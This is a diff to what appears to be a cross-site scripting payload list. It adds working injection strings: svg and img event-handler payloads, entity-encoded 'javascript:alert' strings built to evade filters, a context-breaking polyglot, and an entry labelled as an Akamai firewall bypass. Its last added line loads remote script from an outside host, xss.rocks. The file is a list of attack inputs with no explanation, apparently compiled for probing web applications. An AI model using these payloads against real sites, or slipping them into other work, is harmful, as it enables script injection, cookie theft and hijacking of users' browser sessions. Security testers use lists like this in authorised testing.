@@ -1,9 +1,13 @@
 <details/open/ontoggle=write(1)//
+<svg onload=write(7)>
+<svg onload=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <details/open/ontoggle=console.log(7*7)//
 <Svg%20One%20OnLoad=alert\(1\)\>
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
 --!><Svg/Onload=confirm`cookie`>
 <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`akamaibypass`;>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 <img/src="x"/onerror="prompt(7*7)">
 <img src="x" onerror="console.log(7*7)">
 javascript:prompt(1)
@@ -98,5 +102,5 @@ ayn</script><svg/onload=alert(document.domain)>
 <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
 <iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
-<svg onload=write()>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
 
